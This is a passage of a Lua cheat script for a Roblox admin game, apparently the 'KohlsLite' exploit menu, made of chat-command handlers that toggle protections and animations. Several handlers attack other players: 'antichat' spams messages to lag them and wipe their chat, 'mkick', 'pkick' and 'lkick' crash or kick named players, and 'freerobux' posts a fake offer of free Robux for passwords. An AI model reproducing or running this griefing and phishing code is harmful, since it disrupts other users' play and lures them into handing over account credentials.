                ALLantiglow = false
                Remind("Turned this anti off for everyone!")
        else
                Remind("Invalid argument: Must be me, others, or all")
        end    
    end

    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'antihc' then
        local args = string.split(msg, " ")
        if args[2] == "me" then
                antis.antihealthchange = true
                Remind("Turned this anti on for you!")
        elseif args[2] == "others" then
                ALLantihealthc = true
                Remind("Turned this anti on for others!")
        elseif args[2] == "all" then
                antis.antihealthchange = true
                ALLantihealthc = true
                Remind("Turned this anti on for everyone!")
        else
                Remind("Invalid argument: Must be me, others, or all")
        end    
    end

    if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'unantihc' then
        local args = string.split(msg, " ")
        if args[2] == "me" then
                antis.antihealthchange = false
                Remind("Turned this anti off for you!")
        elseif args[2] == "others" then
                ALLantihealthc = false
                Remind("Turned this anti off for others!")
        elseif args[2] == "all" then
                antis.antihealthchange = false
                ALLantihealthc = false
                Remind("Turned this anti off for everyone!")
        else
                Remind("Invalid argument: Must be me, others, or all")
        end    
    end

    if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'antijail' then
        local args = string.split(msg, " ")
        if args[2] == "me" then
                antis.antijail = true
                Remind("Turned this anti on for you!")
        elseif args[2] == "others" then
                ALLantijail = true
                Remind("Turned this anti on for others!")
        elseif args[2] == "all" then
                antis.antijail = true
                ALLantijail = true
                Remind("Turned this anti on for everyone!")
        else
                Remind("Invalid argument: Must be me, others, or all")
        end    
    end

    if string.sub(msg:lower(), 1, #prefix + 10) == prefix..'unantijail' then
        local args = string.split(msg, " ")
        if args[2] == "me" then
                antis.antijail = false
                Remind("Turned this anti off for you!")
        elseif args[2] == "others" then
                ALLantijail = false
                Remind("Turned this anti off for others!")
        elseif args[2] == "all" then
                antis.antijail = false
                ALLantijail = false
                Remind("Turned this anti off for everyone!")
        else
                Remind("Invalid argument: Must be me, others, or all")
        end    
    end

    if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'antijump' then
        local args = string.split(msg, " ")
        if args[2] == "me" then
                antis.antijump = true
                Remind("Turned this anti on for you!")
        elseif args[2] == "others" then
                ALLantijump = true
                Remind("Turned this anti on for others!")
        elseif args[2] == "all" then
                antis.antijump = true
                ALLantijump = true
                Remind("Turned this anti on for everyone!")
        else
                Remind("Invalid argument: Must be me, others, or all")
        end    
    end

    if string.sub(msg:lower(), 1, #prefix + 10) == prefix..'unantijump' then
        local args = string.split(msg, " ")
        if args[2] == "me" then
                antis.antijump = false
                Remind("Turned this anti off for you!")
        elseif args[2] == "others" then
                ALLantijump = false
                Remind("Turned this anti off for others!")
        elseif args[2] == "all" then
                antis.antijump = false
                ALLantijump = false
                Remind("Turned this anti off for everyone!")
        else
                Remind("Invalid argument: Must be me, others, or all")
        end    
    end

    if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'antikill' then
        local args = string.split(msg, " ")
	if #args == 2 then
        	if args[2] == "me" then
                	antis.antikill = true
                	Remind("Turned this anti on for you!")
        	elseif args[2] == "others" then
                	ALLantikill = true
                	Remind("Turned this anti on for others!")
        	elseif args[2] == "all" then
               		antis.antikill = true
                	ALLantikill = true
                	Remind("Turned this anti on for everyone!")
        	else
		  	kia = args[2]
           	  	PLAYERCHECK(kia)
	         	if player ~= nil then
				if not table.find(antikill, player) then
					Remind(player.." is on the list now!")
					table.insert(antikill, player)
				else
					Remind(player.." is already in the table!")
				end
                 	else                           
                        	Remind('Cannot find player with the name: '..dasplayer)
			end
                end
	else
                Remind("Invalid amount of arguments: Must be me, others, all or a player!")
        end
    end

    if string.sub(msg:lower(), 1, #prefix + 10) == prefix..'unantikill' then
        local args = string.split(msg, " ")
        if #args == 2 then
        	if args[2] == "me" then
                	antis.antikill = false
                	Remind("Turned this anti off for you!")
        	elseif args[2] == "others" then
                	ALLantikill = false
                	Remind("Turned this anti off for others!")
        	elseif args[2] == "all" then
               		antis.antikill = false
                	ALLantikill = false
                	Remind("Turned this anti off for everyone!")
        	else
		  	kia = args[2]
           	  	PLAYERCHECK(kia)
	         	if player ~= nil then
				if table.find(antikill, player) then
					Remind(player.." is no longer in the table!")
					table.remove(antikill, table.find(antikill, player))
				else
					Remind(player.." was never in the list!")
				end
                 	else                           
                        	Remind('Cannot find player with the name: '..dasplayer)
			end
                end
	else
                Remind("Invalid amount of arguments: Must be me, others, all or a player!")
        end
    end

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'antifly' then -- forgot to add this to the list lmao
        local args = string.split(msg, " ")
        if args[2] == "me" then
                antis.antifly = true
                Remind("Turned this anti on for you!")
        elseif args[2] == "others" then
                ALLantifly = true
                Remind("Turned this anti on for others!")
        elseif args[2] == "all" then
                antis.antifly = true
                ALLantifly = true
                Remind("Turned this anti on for everyone!")
        else
                Remind("Invalid argument: Must be me, others, or all")
        end
    end

    if string.sub(msg:lower(), 1, #prefix + 9) == prefix..'unantifly' then -- forgot to add this to the list lmao
        local args = string.split(msg, " ")
        if args[2] == "me" then
                antis.antifly = false
                Remind("Turned this anti off for you!")
        elseif args[2] == "others" then
                ALLantifly = false
                Remind("Turned this anti off for others!")
        elseif args[2] == "all" then
                antis.antifly = false
                ALLantifly = false
                Remind("Turned this anti off for everyone!")
        else
                Remind("Invalid argument: Must be me, others, or all")
        end
    end

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'antinoc' then -- yes
                antis.antinoclip = true
                Remind("Turned this anti on for you!")
    end

    if string.sub(msg:lower(), 1, #prefix + 9) == prefix..'unantinoc' then -- yes
                antis.antinoclip = false
                Remind("Turned this anti off for you!")
    end

    if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'antichar' then
        local args = string.split(msg, " ")
        if args[2] == "me" then
                antis.antichar = true
                Remind("Turned this anti on for you!")
        elseif args[2] == "others" then
                ALLantichar = true
                Remind("Turned this anti on for others!")
        elseif args[2] == "all" then
                antis.antichar = true
                ALLantichar = true
                Remind("Turned this anti on for everyone!")
        else
                Remind("Invalid argument: Must be me, others, or all")
        end    
    end

    if string.sub(msg:lower(), 1, #prefix + 10) == prefix..'unantichar' then
        local args = string.split(msg, " ")
        if args[2] == "me" then
                antis.antichar = false
                Remind("Turned this anti off for you!")
        elseif args[2] == "others" then
                ALLantichar = false
                Remind("Turned this anti off for others!")
        elseif args[2] == "all" then
                antis.antichar = false
                ALLantichar = false
                Remind("Turned this anti off for everyone!")
        else
                Remind("Invalid argument: Must be me, others, or all")
        end    
    end

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'antimsg' then
        antis.antimessage = true
        Remind("Turned this anti on for you!")
    end

    if string.sub(msg:lower(), 1, #prefix + 9) == prefix..'unantimsg' then
        antis.antimessage = false
        Remind("Turned this anti off for you!")
    end

    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'antitp' then
        antitp = true
        Remind("Turned this anti on for you!")
    end

    if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'unantitp' then
        antitp = false
        Remind("Turned this anti off for you!")
    end

  if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'antivoid' then
        antis.antivoid = true
        Remind("Turned this anti on for you!")
    end

    if string.sub(msg:lower(), 1, #prefix + 10) == prefix..'unantivoid' then
        antis.antivoid = false
        Remind("Turned this anti off for you!")
    end

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'antisky' then
        antis.antiskydive = true
        Remind("Turned this anti on for you!")
    end

    if string.sub(msg:lower(), 1, #prefix + 9) == prefix..'unantisky' then
        antis.antiskydive = false
        Remind("Turned this anti off for you!")
    end

    if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'antiname' then
        local args = string.split(msg, " ")
        if args[2] == "me" then
                antis.antiname = true
                Remind("Turned this anti on for you!")
        elseif args[2] == "others" then
                ALLantiname = true
                Remind("Turned this anti on for others!")
        elseif args[2] == "all" then
                antis.antiname = true
                ALLantiname = true
                Remind("Turned this anti on for everyone!")
        else
                Remind("Invalid argument: Must be me, others, or all")
        end     
    end

    if string.sub(msg:lower(), 1, #prefix + 10) == prefix..'unantiname' then
        local args = string.split(msg, " ")
        if args[2] == "me" then
                antis.antiname = false
                Remind("Turned this anti off for you!")
        elseif args[2] == "others" then
                ALLantiname = false
                Remind("Turned this anti off for others!")
        elseif args[2] == "all" then
                antis.antiname = false
                ALLantiname = false
                Remind("Turned this anti off for everyone!")
        else
                Remind("Invalid argument: Must be me, others, or all")
        end     
    end

    if string.sub(msg:lower(), 1, #prefix + 13) == prefix..'antiparticles' then
        local args = string.split(msg, " ")
        if args[2] == "me" then
                antis.antiparticles = true
                Remind("Turned this anti on for you!")
        elseif args[2] == "others" then
                ALLantiparticles = true
                Remind("Turned this anti on for others!")
        elseif args[2] == "all" then
                antis.antiparticles = true
                ALLantiparticles = true
                Remind("Turned this anti on for everyone!")
        else
                Remind("Invalid argument: Must be me, others, or all")
        end     
    end

    if string.sub(msg:lower(), 1, #prefix + 15) == prefix..'unantiparticles' then
        local args = string.split(msg, " ")
        if args[2] == "me" then
                antis.antiparticles = false
                Remind("Turned this anti off for you!")
        elseif args[2] == "others" then
                ALLantiparticles = false
                Remind("Turned this anti off for others!")
        elseif args[2] == "all" then
                antis.antiparticles = false
                ALLantiparticles = false
                Remind("Turned this anti off for everyone!")
        else
                Remind("Invalid argument: Must be me, others, or all")
        end     
    end

    if string.sub(msg:lower(), 1, #prefix + 10) == prefix..'antipunish' then
        local args = string.split(msg, " ")
        if args[2] == "me" then
                antis.antipunish = true
                Remind("Turned this anti on for you!")
        elseif args[2] == "others" then
                ALLantipunish = true
                Remind("Turned this anti on for others!")
        elseif args[2] == "all" then
                antis.antipunish = true
                ALLantipunish = true
                Remind("Turned this anti on for everyone!")
        else
                Remind("Invalid argument: Must be me, others, or all")
        end         
    end

    if string.sub(msg:lower(), 1, #prefix + 12) == prefix..'unantipunish' then
        local args = string.split(msg, " ")
        if args[2] == "me" then
                antis.antipunish = false
                Remind("Turned this anti off for you!")
        elseif args[2] == "others" then
                ALLantipunish = false
                Remind("Turned this anti off for others!")
        elseif args[2] == "all" then
                antis.antipunish = false
                ALLantipunish = false
                Remind("Turned this anti off for everyone!")
        else
                Remind("Invalid argument: Must be me, others, or all")
        end         
    end

    if string.sub(msg:lower(), 1, #prefix + 10) == prefix..'antirocket' then
         local args = string.split(msg, " ")
        if args[2] == "me" then
                antis.antirocket = true
                Remind("Turned this anti on for you!")
        elseif args[2] == "others" then
                ALLantirocket = true
                Remind("Turned this anti on for others!")
        elseif args[2] == "all" then
                antis.antirocket = true
                ALLantirocket = true
                Remind("Turned this anti on for everyone!")
        else
                Remind("Invalid argument: Must be me, others, or all")
        end             
    end

    if string.sub(msg:lower(), 1, #prefix + 12) == prefix..'unantirocket' then
         local args = string.split(msg, " ")
        if args[2] == "me" then
                antis.antirocket = false
                Remind("Turned this anti off for you!")
        elseif args[2] == "others" then
                ALLantirocket = false
                Remind("Turned this anti off for others!")
        elseif args[2] == "all" then
                antis.antirocket = false
                ALLantirocket = false
                Remind("Turned this anti off for everyone!")
        else
                Remind("Invalid argument: Must be me, others, or all")
        end             
    end

    if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'antikick' then
                antikick2 = true
    end

    if string.sub(msg:lower(), 1, #prefix + 10) == prefix..'unantikick' then
                antikick2 = false
    end

    if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'antit' then
                antitoolm = true
    end

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'unantit' then
                antitoolm = false
    end

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'antisit' then
         local args = string.split(msg, " ")
        if args[2] == "me" then
                antis.antisit = true
                Remind("Turned this anti on for you!")
        elseif args[2] == "others" then
                ALLantisit = true
                Remind("Turned this anti on for others!")
        elseif args[2] == "all" then
                antis.antisit = true
                ALLantisit = true
                Remind("Turned this anti on for everyone!")
        else
                Remind("Invalid argument: Must be me, others, or all")
        end             
    end

    if string.sub(msg:lower(), 1, #prefix + 9) == prefix..'unantisit' then
         local args = string.split(msg, " ")
        if args[2] == "me" then
                antis.antisit = false
                Remind("Turned this anti off for you!")
        elseif args[2] == "others" then
                ALLantisit = false
                Remind("Turned this anti off for others!")
        elseif args[2] == "all" then
                antis.antisit = false
                ALLantisit = false
                Remind("Turned this anti off for everyone!")
        else
                Remind("Invalid argument: Must be me, others, or all")
        end             
    end

    if string.sub(msg:lower(), 1, #prefix + 11) == prefix..'antiseizure' then
        local args = string.split(msg, " ")
        if args[2] == "me" then
                antis.antiseizure = true
                Remind("Turned this anti on for you!")
        elseif args[2] == "others" then
                ALLantiseizure = true
                Remind("Turned this anti on for others!")
        elseif args[2] == "all" then
                antis.antiseizure = true
                ALLantiseizure = true
                Remind("Turned this anti on for everyone!")
        else
                Remind("Invalid argument: Must be me, others, or all")
        end       
    end

    if string.sub(msg:lower(), 1, #prefix + 13) == prefix..'unantiseizure' then
        local args = string.split(msg, " ")
        if args[2] == "me" then
                antis.antiseizure = false
                Remind("Turned this anti off for you!")
        elseif args[2] == "others" then
                ALLantiseizure = false
                Remind("Turned this anti off for others!")
        elseif args[2] == "all" then
                antis.antiseizure = false
                ALLantiseizure = false
                Remind("Turned this anti off for everyone!")
        else
                Remind("Invalid argument: Must be me, others, or all")
        end       
     end

    if string.sub(msg:lower(), 1, #prefix + 9) == prefix..'antismoke' then
        local args = string.split(msg, " ")
        if args[2] == "me" then
                antis.antismoke = true
                Remind("Turned this anti on for you!")
        elseif args[2] == "others" then
                ALLantismoke = true
                Remind("Turned this anti on for others!")
        elseif args[2] == "all" then
                antis.antismoke = true
                ALLantismoke = true
                Remind("Turned this anti on for everyone!")
        else
                Remind("Invalid argument: Must be me, others, or all")
        end       
    end

    if string.sub(msg:lower(), 1, #prefix + 11) == prefix..'unantismoke' then
        local args = string.split(msg, " ")
        if args[2] == "me" then
                antis.antismoke = false
                Remind("Turned this anti off for you!")
        elseif args[2] == "others" then
                ALLantismoke = false
                Remind("Turned this anti off for others!")
        elseif args[2] == "all" then
                antis.antismoke = false
                ALLantismoke = false
                Remind("Turned this anti off for everyone!")
        else
                Remind("Invalid argument: Must be me, others, or all")
        end       
    end

    if string.sub(msg:lower(), 1, #prefix + 12) == prefix..'antisparkles' then
        local args = string.split(msg, " ")
        if args[2] == "me" then
                antis.antisparkles = true
                Remind("Turned this anti on for you!")
        elseif args[2] == "others" then
                ALLantisparkles = true
                Remind("Turned this anti on for others!")
        elseif args[2] == "all" then
                 antis.antisparkles = true
                ALLantisparkles = true
                Remind("Turned this anti on for everyone!")
        else
                Remind("Invalid argument: Must be me, others, or all")
        end        
    end

    if string.sub(msg:lower(), 1, #prefix + 14) == prefix..'unantisparkles' then
        local args = string.split(msg, " ")
        if args[2] == "me" then
                antis.antisparkles = false
                Remind("Turned this anti off for you!")
        elseif args[2] == "others" then
                ALLantisparkles = false
                Remind("Turned this anti off for others!")
        elseif args[2] == "all" then
                antis.antisparkles = false
                ALLantisparkles = false
                Remind("Turned this anti off for everyone!")
        else
                Remind("Invalid argument: Must be me, others, or all")
        end        
    end

    if string.sub(msg:lower(), 1, #prefix + 9) == prefix..'antispeed' then
        local args = string.split(msg, " ")
        if args[2] == "me" then
                antis.antispeed = true
                Remind("Turned this anti on for you!")
        elseif args[2] == "others" then
                ALLantispeed = true
                Remind("Turned this anti on for others!")
        elseif args[2] == "all" then
                antis.antispeed = true
                ALLantispeed = true
                Remind("Turned this anti on for everyone!")
        else
                Remind("Invalid argument: Must be me, others, or all")
        end       
    end

    if string.sub(msg:lower(), 1, #prefix + 11) == prefix..'unantispeed' then
        local args = string.split(msg, " ")
        if args[2] == "me" then
                antis.antispeed = false
                Remind("Turned this anti off for you!")
        elseif args[2] == "others" then
                ALLantispeed = false
                Remind("Turned this anti off for others!")
        elseif args[2] == "all" then
                antis.antispeed = false
                ALLantispeed = false
                Remind("Turned this anti off for everyone!")
        else
                Remind("Invalid argument: Must be me, others, or all")
        end       
    end

    if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'antispin' then
        local args = string.split(msg, " ")
        if args[2] == "me" then
                antis.antispin = true
                Remind("Turned this anti on for you!")
        elseif args[2] == "others" then
                ALLantispin = true
                Remind("Turned this anti on for others!")
        elseif args[2] == "all" then
                antis.antispin = true
                ALLantispin = true
                Remind("Turned this anti on for everyone!")
        else
                Remind("Invalid argument: Must be me, others, or all")
        end       
    end

    if string.sub(msg:lower(), 1, #prefix + 10) == prefix..'unantispin' then
        local args = string.split(msg, " ")
        if args[2] == "me" then
                antis.antispin = false
                Remind("Turned this anti off for you!")
        elseif args[2] == "others" then
                ALLantispin = false
                Remind("Turned this anti off for others!")
        elseif args[2] == "all" then
                antis.antispin = false
                ALLantispin = false
                Remind("Turned this anti off for everyone!")
        else
                Remind("Invalid argument: Must be me, others, or all")
        end       
    end

    if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'antistun' then
        local args = string.split(msg, " ")
        if args[2] == "me" then
                antis.antistun = true
                Remind("Turned this anti on for you!")
        elseif args[2] == "others" then
                ALLantistun = true
                Remind("Turned this anti on for others!")
        elseif args[2] == "all" then
                antis.antistun = true
                ALLantistun = true
                Remind("Turned this anti on for everyone!")
        else
                Remind("Invalid argument: Must be me, others, or all")
        end       
    end

    if string.sub(msg:lower(), 1, #prefix + 10) == prefix..'unantistun' then
        local args = string.split(msg, " ")
        if args[2] == "me" then
                antis.antistun = false
                Remind("Turned this anti off for you!")
        elseif args[2] == "others" then
                ALLantistun = false
                Remind("Turned this anti off for others!")
        elseif args[2] == "all" then
                antis.antistun = false
                ALLantistun = false
                Remind("Turned this anti off for everyone!")
        else
                Remind("Invalid argument: Must be me, others, or all")
        end       
    end

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'antistg' then
        local args = string.split(msg, " ")
        if args[2] == "me" then
                antis.antisetgrav = true
                Remind("Turned this anti on for you!")
        elseif args[2] == "others" then
                ALLantisetgrav = true
                Remind("Turned this anti on for others!")
        elseif args[2] == "all" then
                antis.antisetgrav = true
                ALLantisetgrav = true
                Remind("Turned this anti on for everyone!")
        else
                Remind("Invalid argument: Must be me, others, or all")
        end       
    end

    if string.sub(msg:lower(), 1, #prefix + 9) == prefix..'unantistg' then
        local args = string.split(msg, " ")
        if args[2] == "me" then
                antis.antisetgrav = false
                Remind("Turned this anti off for you!")
        elseif args[2] == "others" then
                ALLantisetgrav = false
                Remind("Turned this anti off for others!")
        elseif args[2] == "all" then
                antis.antisetgrav = false
                ALLantisetgrav = false
                Remind("Turned this anti off for everyone!")
        else
                Remind("Invalid argument: Must be me, others, or all")
        end       
    end

    if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'antiswag' then
        local args = string.split(msg, " ")
        if args[2] == "me" then
                antis.antiswag = true
                Remind("Turned this anti on for you!")
        elseif args[2] == "others" then
                ALLantiswag = true
                Remind("Turned this anti on for others!")
        elseif args[2] == "all" then
                antis.antiswag = true
                ALLantiswag = true
                Remind("Turned this anti on for everyone!")
        else
                Remind("Invalid argument: Must be me, others, or all")
        end       
    end

    if string.sub(msg:lower(), 1, #prefix + 10) == prefix..'unantiswag' then
        local args = string.split(msg, " ")
        if args[2] == "me" then
                antis.antiswag = false
                Remind("Turned this anti off for you!")
        elseif args[2] == "others" then
                ALLantiswag = false
                Remind("Turned this anti off for others!")
        elseif args[2] == "all" then
                antis.antiswag = false
                ALLantiswag = false
                Remind("Turned this anti off for everyone!")
        else
                Remind("Invalid argument: Must be me, others, or all")
        end       
    end

    if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'antichat' then
        antichat = true
        antis.antimessage = true -- stop you from crashing :)
	Remind("Spamming h messages with emojis to lag and remove chat for people")
    end

    if string.sub(msg:lower(), 1, #prefix + 10) == prefix..'unantichat' then
        antichat = false
        antis.antimessage = false
	Remind("No longer spamming h messages with emojis to lag and remove chat for people")
    end

    if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'mkick' then -- haha i found it
        acplr = string.sub(msg:lower(), #prefix + 7)
           PLAYERCHECK(acplr)
                   if player ~= nil and not table.find(nokick, player) then
			acplr = player
                           antichatplr = true
                elseif table.find(nokick, player) then
                        Remind("Sorry, this player cannot be kicked!")
                else                           
                        Remind("Player doesn't exist!")
                  end
    end

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'unmkick' then
        antichatplr = false
        Chat("reset "..acplr)
	Remind("No longer kicking "..acplr)
    end

    if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'pkick' then
                   acplr = string.sub(msg:lower(), #prefix + 7)
                   PLAYERCHECK(acplr)
                   if player ~= nil and not table.find(nokick, player) then
                           Chat("freeze "..acplr)
                           Chat("dog "..acplr)
                           Chat("rainbowify "..acplr)
                           Chat("name "..acplr.. " \n Imagine Getting \n CRASHED!!!")
			   acplr = player
                           antichatplr = true
                   elseif table.find(nokick, player) then
                        Remind("Sorry, this player cannot be kicked!")
                else
                           Remind("Player doesn't exist!")
                  end
   end

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'unpkick' then
                antichatplr = false
                Chat("reset "..acplr)
		Remind("No longer kicking "..acplr)
    end

    if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'lkick' then
                   acplr = string.sub(msg:lower(), #prefix + 7)
                   PLAYERCHECK(acplr)
                   if player ~= nil and not table.find(nokick, player) then
                           Chat(prefix.."laser "..acplr)
			   Chat("blind "..acplr)
                        antichatplr = true
                   elseif table.find(nokick, player) then
                        Remind("Sorry, this player cannot be kicked!")
                else
                           Remind("Player doesn't exist!")
                  end
   end

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'unlkick' then
                antichatplr = false
                Chat("reset "..acplr)
		Remind("No longer kicking "..acplr)
    end

    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'autoff' then
        autos.autoff = true
        Remind("Auto ff is on!")
    end

    if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'unautoff' then
        autos.autoff = false
        Remind("Auto ff is off!")
    end

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'autogod' then
        autos.autogod = true
        Remind("Auto god is on!")
    end

    if string.sub(msg:lower(), 1, #prefix + 9) == prefix..'unautogod' then
        autos.autogod = false
        Remind("Auto god is off!")
    end      

    if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'autochar' then
  	local args = string.split(msg, " ")
        if args[2] == "me" then
                autocharme = true
		oname = args[3]
		autocharid = game.Players:GetUserIdFromNameAsync(oname)
                Remind("Auto char is on for you!")
        elseif args[2] == "others" then
                autocharall = true
		oname = args[3]
		autocharid = game.Players:GetUserIdFromNameAsync(oname)
                Remind("Auto char is on for others!")
        elseif args[2] == "all" then
                autocharme = true
                autocharall = true
		oname = args[3]
		autocharid = game.Players:GetUserIdFromNameAsync(oname)
                Remind("Auto char is on for everyone!")
        else
                Remind("Invalid argument: Must be me, others, or all")
        end       
    end

    if string.sub(msg:lower(), 1, #prefix + 10) == prefix..'unautochar' then
  	local args = string.split(msg, " ")
        if args[2] == "me" then
                autocharme = false
                Remind("Auto char is off for you!")
		Chat("unchar me")
        elseif args[2] == "others" then
                autocharall = false
                Remind("Auto char is off for others!")
		Chat("unchar others")
        elseif args[2] == "all" then
                autocharme = false
                autocharall = false
                Remind("Auto char is off for everyone!")
		Chat("unchar all")
        else
                Remind("Invalid argument: Must be me, others, or all")
        end       
    end

    if string.sub(msg:lower(), 1, #prefix + 9) == prefix..'freerobux' then 
		Chat("h \n\n\n [agspureiam]: Hey KAH users! Give me your passsword and I can give you robux for FREE! \n\n\n")
    end

    if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'reserver' then -- kohlsnoob and betterpersons (tech)
	Remind("Checking...")

        pcall(function()
                if not game:GetService("Workspace").Terrain["_Game"].Admin:FindFirstChild("Regen") then
                    Remind("Regen was not found.")
                end
		
               if not game:GetService("Workspace").Terrain["_Game"].Workspace:FindFirstChild("Baseplate") then
                    Remind("Baseplate was not found.")
                end
        end)

        pcall(function()
                if not game:GetService("Workspace").Terrain._Game.Workspace["Basic House"]:FindFirstChild("SmoothBlockModel112") then
                    Remind("House floor missing.")
                end
        end)

        pcall(function()
                if game:GetService("Workspace").Terrain["_Game"].Workspace.Baseplate.CFrame.Y > 1.5 then
                    Remind("Baseplate at wrong place")
                end
		
		if game:GetService("Workspace").Terrain._Game.Workspace["Basic House"].SmoothBlockModel112.CFrame.Y > 15 then
		    Remind("House floor at wrong place.")
		end
        end)

        pcall(function()
                if game:GetService("Workspace").Terrain["_Game"].Workspace.Baseplate.CFrame.Y < 0 then
                    Remind("Baseplate at wrong place.")
                end
        end)

	local pads =  workspace.Terrain._Game.Admin.Pads
	
	local padsCount = 0
	for i,v in pairs(pads:GetChildren()) do
		if v:FindFirstChild("Head") then
			padsCount = padsCount + 1
		end
	end
	
	if padsCount == 9 then
		Remind("All admin pads found")
	elseif padsCount == 0 then
		Remind("All admin pads missing")
	else
		Remind(tostring(9-padsCount).." admin pads missing")
	end
	
	local ado = #workspace.Terrain._Game.Workspace.Obby:GetChildren()
	if ado == 10 then
		Remind("All obby jumps found")
	elseif ado == 0 then
		Remind("All obby jumps missing")
	else
		notif(tostring(10-ado).." obby jumps missing")
	end
	
    end

    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'devcmd' then
		Remind("KohlsLite is working!")
    end

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'discord' then
		if setclipboard then
			Remind("Clipboard set to my username on Discord.")
			setclipboard("ts2021 (discord)")
		else
			Remind("Check console for my username on Discord.")
			print("ts2021 (discord)")
		end
    end

    if string.sub(msg:lower(), 1, #prefix + 3) == prefix..'buy' then
		game:GetService("MarketplaceService"):PromptGamePassPurchase(game.Players.LocalPlayer, 883283806)
    end

    if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'purchase' then
		game:GetService("MarketplaceService"):PromptGamePassPurchase(game.Players.LocalPlayer, 883283806)
    end

-- From here, my script becomes infinite yield because of Proton... --
    if string.sub(msg:lower(), 1, #prefix + 2) == prefix..'r6' then
        ChangeRig("R6")
    end

    if string.sub(msg:lower(), 1, #prefix + 3) == prefix..'r15' then
        ChangeRig("R15")
    end  

    if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'dance' then
	local dances = {"27789359", "30196114", "248263260", "45834924", "33796059", "28488254", "52155728"}
	if checkforR15(game.Players.LocalPlayer) then
		dances = {"3333432454", "4555808220", "4049037604", "4555782893", "10214311282", "10714010337", "10713981723", "10714372526", "10714076981", "10714392151", "11444443576"}
	end
	local animation = Instance.new("Animation")
	animation.AnimationId = "rbxassetid://" .. dances[math.random(1, #dances)]
	danceTrack = game.Players.LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid"):LoadAnimation(animation)
	danceTrack.Looped = true
	danceTrack:Play()  
	Remind("Started dancing!")
    end

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'undance' then
	danceTrack:Stop()
	danceTrack:Destroy()   
	Remind("Stopped dancing.")
    end  

    if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'spasm' then
	if not checkforR15(game.Players.LocalPlayer) then
		local pchar = game.Players.LocalPlayer.Character
		local AnimationId = "33796059"
		SpasmAnim = Instance.new("Animation")
		SpasmAnim.AnimationId = "rbxassetid://"..AnimationId
		Spasm = pchar:FindFirstChildOfClass('Humanoid'):LoadAnimation(SpasmAnim)
		Spasm:Play()
		Spasm:AdjustSpeed(99)
		Remind("Started spasming!")
	else
		Remind("This command requires the r6 rig type. Do r6.")
	end
    end

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'unspasm' then
		Spasm:Stop()
		SpasmAnim:Destroy()
		Remind("Ended the spasm.")
    end

    if string.sub(msg:lower(), 1, #prefix + 9) == prefix..'headthrow' then
	if not checkforR15(game.Players.LocalPlayer) then
		local AnimationId = "35154961"
		local Anim = Instance.new("Animation")
		Anim.AnimationId = "rbxassetid://"..AnimationId
		local k = game.Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid'):LoadAnimation(Anim)
		k:Play(0)
		k:AdjustSpeed(1)
		Remind("Throwing your head!")
	else
		Remind("This command requires the r6 rig type. Do r6.")
	end
    end

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'headsit' then
		local dasplayer = string.sub(msg:lower(), #prefix + 9)
        	PLAYERCHECK(dasplayer)
        	if player == nil then 
			return 
		else
			hs = cplr
		end

		RunService = game:GetService("RunService")

		if headSit then 
			headSit:Disconnect() 
		end

		game.Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid').Sit = true
		task.wait()

		headSit = RunService.Heartbeat:Connect(function()
			if game:GetService("Players"):FindFirstChild(hs.Name) and hs.Character ~= nil and getRoot(hs.Character) and getRoot(game.Players.LocalPlayer.Character) and game.Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid').Sit == true then
					getRoot(game.Players.LocalPlayer.Character).CFrame = getRoot(hs.Character).CFrame * CFrame.Angles(0,math.rad(0),0)* CFrame.new(0,1.6,0.4)
			else
					headSit:Disconnect()
			end
		end)
		Remind("Headsitting on the player!")
    end

    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'carpet' then
		local dasplayer = string.sub(msg:lower(), #prefix + 8)
        	PLAYERCHECK(dasplayer)
        	if player == nil then 
			return Remind("Fail: User not found!")
		else
			caplr = cplr
		end

		RunService = game:GetService("RunService")

		if not checkforR15(game.Players.LocalPlayer) then
			Chat(prefix..'uncarpet')
			task.wait()
			carpetAnim = Instance.new("Animation")
			carpetAnim.AnimationId = "rbxassetid://282574440"
			carpet = game.Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid'):LoadAnimation(carpetAnim)
			carpet:Play(.1, 1, 1)

			local carpetplr = caplr

			carpetDied = game.Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid').Died:Connect(function()
